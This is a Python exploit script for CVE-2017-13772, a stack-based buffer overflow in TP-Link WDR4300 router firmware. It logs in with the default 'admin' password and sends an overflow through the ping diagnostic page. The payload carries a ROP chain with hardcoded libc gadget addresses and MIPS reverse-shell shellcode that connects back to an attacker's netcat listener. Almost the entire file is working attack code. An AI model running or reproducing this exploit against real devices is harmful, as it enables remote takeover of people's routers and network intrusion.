#!/usr/bin/python3

import sys
import hashlib 
import base64
import requests 
import binascii
import socket


"""
RCE via stack-based overflow on TP-Link WDR4300 (N750) devices, using CVE-2017-13772.

This was initially discovered on TP-Link WR940N by Tim Carrington, @__invictus_ 
https://fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/

Tested on Firmware versions 3.13.33, Build 130618 and 3.14.3 Build 150518, hardware WDR4300 v1.

Usage:
1) Start listener on attacker machine: nc -nlvvp 31337
2) Execute script: python exploit.py <attacker_ip>

"""

def main(argv):
    if len(sys.argv) < 2:
        print("Usage: python exploit.py <attacker_ip>")
        sys.exit(1)

    password = "admin"
    target = "192.168.0.1:80"
    attacker_ip = sys.argv[1]

    attacker = binascii.hexlify(socket.inet_aton(attacker_ip))
    ip = [attacker[i:i+2] for i in range(0, len(attacker), 2)]

    if '00' in ip or '20' in ip:
        print("[-] Specified attacker IP will result in bad characters being present in the shellcode. Avoid any IPs containing .0. and .32.")
        sys.exit(1) 

    url = "http://" + target + "/"
    try:
        r = requests.get(url=url)
    except:
        print("[-] Could not connect to target: " + target)
        sys.exit(1)

    if 'WWW-Authenticate' in r.headers.keys():
        if not 'WDR4300' in r.headers['WWW-Authenticate']:
            print("[-] This is not TP-Link WDR4300 (N750)")
            sys.exit(1)
    else:
        print("[-] This does not seem to be the web interface of a router!")


    credentials = "admin" + ":" + hashlib.md5(password).hexdigest()
    auth = base64.b64encode(credentials)
    url = "http://" + target + "/userRpm/LoginRpm.htm?Save=Save"

    print("[+] Setting target to: " + target)
    print("[+] Using default admin password: " + password)
    print("[+] Cookie set to: Authorization=Basic%20" + auth)

    h = {}
    h["Cookie"] = "Authorization=Basic%20" + auth
    h['Upgrade-Insecure-Requests'] = '1'
    h['Referer'] = 'http://' + target + '/'

    r = requests.get(url = url, headers=h) 
    data = r.text
    if "httpAutErrorArray" in data:
        print('[-] Could not login to the admin interface')
        sys.exit(1)

    older_fw = False
    # older firmware, e.g., 3.13.33 
    if "<TITLE>Login Incorrect</TITLE>" in data:
        print("[-] Incorrect login, perhaps an older firmware? Sending digest authentication using the Authorization header instead..")
        credentials = "admin:" + password
        auth = base64.b64encode(credentials)
        url = "http://" + target + "/"
        h = {}
        h["Authorization"] = "Basic%20" + auth
        h['Upgrade-Insecure-Requests'] = '1'
        h['Referer'] = 'http://' + target + '/'
        r = requests.get(url = url, headers=h) 
        data = r.text
        if 'window.parent.location.href' not in data:
            print("[-] Failed to login to the admin interface")
            sys.exit(1)
        print('[+] Older firmware confirmed, successfully logged in')
        older_fw = True

    authenticated_url = data.split('window.parent.location.href = ')[1].split(';')[0].replace('"','')

    unique_id = ''
    if not older_fw:
        unique_id =  authenticated_url.split('/userRpm')[0].split('/')[3] + '/'
        print("[+] Authentication succeeded, got unique id: " + unique_id.replace('/',''))
    
    # now we deliver the exploit payload via a GET request
    h['Referer'] = 'http://' + target + '/' + unique_id + 'userRpm/DiagnosticRpm.htm'
  

    # NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes)
    nopsled = ""
    for i in range(12):
        nopsled += "\x26\x40\x08\x01"

    # identified bad characters: 0x20,0x00
    # Using reverse tcp shellcode from https://www.exploit-db.com/exploits/45541
    buf = b""
    buf += "\x24\x0f\xff\xfa"      # li      $t7, -6
    buf += "\x01\xe0\x78\x27"      # nor     $t7, $zero
    buf += "\x21\xe4\xff\xfd"      # addi    $a0, $t7, -3
    buf += "\x21\xe5\xff\xfd"      # addi    $a1, $t7, -3
    buf += "\x28\x06\xff\xff"      # slti    $a2, $zero, -1
    buf += "\x24\x02\x10\x57"      # li      $v0, 4183 ( sys_socket )
    buf += "\x01\x01\x01\x0c"      # syscall 0x40404
    buf += "\xaf\xa2\xff\xff"      # sw      $v0, -1($sp)
    buf += "\x8f\xa4\xff\xff"      # lw      $a0, -1($sp)
    buf += "\x34\x0f\xff\xfd"      # li      $t7, -3 ( sa_family = AF_INET )
    buf += "\x01\xe0\x78\x27"      # nor     $t7, $zero
    buf += "\xaf\xaf\xff\xe0"      # sw      $t7, -0x20($sp)
    buf += "\x3c\x0e\x7a\x69"      # lui     $t6, 0x7a69 ( sin_port = 0x7a69 )
    buf += "\x35\xce\x7a\x69"      # ori     $t6, $t6, 0x7a69
    buf += "\xaf\xae\xff\xe4"      # sw      $t6, -0x1c($sp)
    buf += "\x3c\x0e" + ip[0].decode('hex')  + ip[1].decode('hex')       # lui     $t6, 0xAABB         ( sin_addr = 0xAABB ...
    buf += "\x35\xce" + ip[2].decode('hex')  + ip[3].decode('hex')       # ori     $t6, $t6, 0xCCDD                 ... 0xCCDD
    buf += "\xaf\xae\xff\xe6"      # sw      $t6, -0x1a($sp)
    buf += "\x27\xa5\xff\xe2"      # addiu   $a1, $sp, -0x1e
    buf += "\x24\x0c\xff\xef"      # li      $t4, -17  ( addrlen = 16 )
    buf += "\x01\x80\x30\x27"      # nor     $a2, $t4, $zero
    buf += "\x24\x02\x10\x4a"      # li      $v0, 4170 ( sys_connect )
    buf += "\x01\x01\x01\x0c"      # syscall 0x40404
    buf += "\x24\x0f\xff\xfd"      # li      t7,-3
    buf += "\x01\xe0\x28\x27"      # nor     a1,t7,zero
    buf += "\x8f\xa4\xff\xff"      # lw      $a0, -1($sp)  
    buf += "\x24\x02\x0f\xdf"      # li      $v0, 4063 ( sys_dup2 )
    buf += "\x01\x01\x01\x0c"      # syscall 0x40404
    buf += "\x24\xa5\xff\xff"      # addi    a1,a1,-1 (\x20\xa5\xff\xff)
    buf += "\x24\x01\xff\xff"      # li      at,-1
    buf += "\x14\xa1\xff\xfb"      # bne     a1,at, dup2_loop
    buf += "\x28\x06\xff\xff"      # slti    $a2, $zero, -1
    buf += "\x3c\x0f\x2f\x2f"      # lui     $t7, 0x2f2f
    buf += "\x35\xef\x62\x69"      # ori     $t7, $t7, 0x6269
    buf += "\xaf\xaf\xff\xec"      # sw      $t7, -0x14($sp)
    buf += "\x3c\x0e\x6e\x2f"      # lui     $t6, 0x6e2f
    buf += "\x35\xce\x73\x68"      # ori     $t6, $t6, 0x7368
    buf += "\xaf\xae\xff\xf0"      # sw      $t6, -0x10($sp)
    buf += "\xaf\xa0\xff\xf4"      # sw      $zero, -0xc($sp)
    buf += "\x27\xa4\xff\xec"      # addiu   $a0, $sp, -0x14
    buf += "\xaf\xa4\xff\xf8"      # sw      $a0, -8($sp)
    buf += "\xaf\xa0\xff\xfc"      # sw      $zero, -4($sp)
    buf += "\x27\xa5\xff\xf8"      # addiu   $a1, $sp, -8
    buf += "\x24\x02\x0f\xab"      # li      $v0, 4011 (sys_execve)
    buf += "\x01\x01\x01\x0c"      # syscall 0x40404

    shellcode = nopsled + buf

    """
    We control $ra, $s0 and $s1 via the buffer overflow.

    libc_base: 0x2aae2000
    First ROP (sleep_gadget): 0x0004c974 + libc_base = 0x2ab2e974
    0x0004c97c      move    t9, s0
    0x0004c980      lw      ra, (var_1ch)
    0x0004c984      lw      s0, (var_18h)
    0x0004c988      addiu   a0, zero, 2 ; arg1
    0x0004c98c      addiu   a1, zero, 1 ; arg2
    0x0004c990      move    a2, zero
    0x0004c994      jr      t9

    sleep is located at 0x00053ca0 => so $s0 = 0x2ab35ca0

    This gadget calls sleep, in this gadget we also set the return adress to the second ROP gadget which is controlled by setting appropriate value on the stack location 0x1c($sp), due to the instruction at 0x0004c980.


    Second ROP (stack_gadget): 0x00039fa8 + libc_base = 0x2ab1bfa8
    0x00039fa8      addiu   s0, sp, 0x28
    0x00039fac      move    a0, s3
    0x00039fb0      move    a1, s0
    0x00039fb4      move    t9, s1
    0x00039fb8      jalr    t9

    This gadget will set s0 to point our shellcode on the stack, that must be located at sp+0x28.
    Then as we control s1, we jump to the last and third ROP gadget.

    Third ROP (call_gadget): 0x000406d8 + libc_base = 0x2ab226d8
    0x000406d8      move    t9, s0
    0x000406dc      jalr    t9

    Jump to the shellcode pointed in s0.
    """

    sleep_addr = "\x2a\xb3\x5c\xa0"
    sleep_gadget = "\x2a\xb2\xe9\x74" 
    stack_gadget = "\x2a\xb1\xbf\xa8"
    call_gadget  = "\x2a\xb2\x26\xd8"

    junk = "J"*28
    payload = "A"*160 + sleep_addr + call_gadget +  sleep_gadget + junk + stack_gadget + shellcode

    p = {'ping_addr': payload, 'doType': 'ping', 'isNew': 'new', 'sendNum': '4', 'pSize':64, 'overTime':'800', 'trHops':'20'}
    url = "http://" + target + "/" + unique_id + "userRpm/PingIframeRpm.htm"
    print("[+] Delivering exploit payload to: " + url)
    try:
        r = requests.get(url = url, params=p, headers=h, timeout=10)
    except: 
        print("[+] Finished delivering exploit")


if __name__ == "__main__":
   main(sys.argv[1:])
